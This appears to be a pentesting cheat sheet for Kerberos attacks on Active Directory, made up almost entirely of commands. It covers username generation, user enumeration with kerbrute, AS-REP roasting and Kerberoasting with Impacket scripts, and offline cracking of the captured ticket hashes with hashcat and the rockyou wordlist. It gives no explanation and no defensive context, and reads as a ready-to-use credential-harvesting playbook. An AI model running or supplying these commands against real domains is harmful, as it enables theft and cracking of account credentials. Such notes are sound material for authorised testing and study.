# Kerberos

### User Discovery

_Compile usernames_

```
/opt/username-anarchy/username-anarchy --input-file ./test-names.txt
```

_Find valid users_

{% code overflow="wrap" %}
```
kerbrute userenum /usr/share/wordlists/seclists/Usernames/Names/names.txt -d $domain --dc $ip
```
{% endcode %}

### Asreproasting

_uf dont require preauth_

{% code overflow="wrap" %}
```
GetNPUsers.py $domain/ -no-pass -usersfile /path/to/names.txt -dc-ip $ip
```
{% endcode %}

```
hashcat -d 2 krb5asrep.txt -m 18200 -a 0 /usr/share/wordlists/rockyou.txt
```

### Kerberoasting

```
python3 /usr/local/bin/GetUserSPNs.py domain.com/user:password -dc-ip $ip -request
```

<pre><code><strong>hashcat -d 2 krb5tgs.txt -m 13100 -a 0 /usr/share/wordlists/rockyou.txt
</strong></code></pre>
